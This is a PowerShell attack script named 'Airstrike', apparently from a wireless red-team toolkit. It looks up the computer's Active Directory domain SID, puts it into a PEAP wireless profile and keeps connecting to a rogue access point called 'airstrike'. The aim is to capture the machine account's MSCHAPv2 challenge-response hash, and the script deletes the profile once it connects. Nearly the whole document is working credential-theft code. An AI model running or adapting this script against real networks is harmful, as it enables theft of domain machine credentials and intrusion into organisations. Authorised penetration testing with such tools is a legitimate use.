function Get-PrimaryDomainSID () {
    <#
    .SYNOPSIS
    Obtains SID of the primary AD domain for the local computer.
    
    .DESCRIPTION
    Computer must be Domain joined in order to retrieve the NTLM 
    hash for the machine account
    
    .OUTPUTS
    System.String 
    
    .EXAMPLE
    > $domainSID = Get-PrimaryDomainSID
    Output S-1-5-21-000000000-000000000-0000000000.
    
    .LINK
    https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
    #>

    [string] $domainSID = $null
    [int] $domainRole = gwmi Win32_ComputerSystem | Select -Expand DomainRole
    [bool] $isDomainMember = ($domainRole -ne 0) -and ($domainRole -ne 2)

    if ($isDomainMember) {
        [string] $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
        [string] $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
        $domainSID = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
    }
    else {
        write-host "[!] Airstrike will not work on non Domain joined machines"
        exit
    }
    return $domainSID
}

function Invoke-Airstrike () {
    <#
    .SYNOPSIS
    Capture machine account MSCHAPv2 challenge response hash.
    
    .DESCRIPTION
    Imports a Wireless Profile XML file configured to use 
    Microsoft Protected EAP (PEAP) and computer authentication.
    
    The Domain SID is sent outside of the PEAP tunnel as the
    anonymous identity parameter. 
     
    This function will continually try to connect to the access
    point in the XML profile. Once a connection is succesful the
    Wireless Profile is removed.
    
    .EXAMPLE
    > Invoke-Airstrike
    
    .LINK
    https://github.com/breakfix/wireless/tree/master/Airstrike
    #>

    $domainSID = Get-PrimaryDomainSID
    (Get-Content '.\airstrike_template.xml') -replace "domain_SID", $domainSID | Set-Content '.\airstrike.xml'
    Write-host "[+] Importing Wireless Profile"
    Invoke-Expression "netsh wlan add profile filename=airstrike.xml user=current"

    while ($true) {   
        Invoke-Expression "netsh wlan connect ssid=airstrike name=airstrike"
        sleep 2
  
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Connection Successful! Removing Wireless Profile"
            Invoke-Expression "netsh wlan delete profile name=airstrike"
            return
        }
        elseif ($LASTEXITCODE -eq 1) {
            Write-Host "[+] Trying to connect..."
            sleep 5
        }
    }
}
Invoke-Airstrike
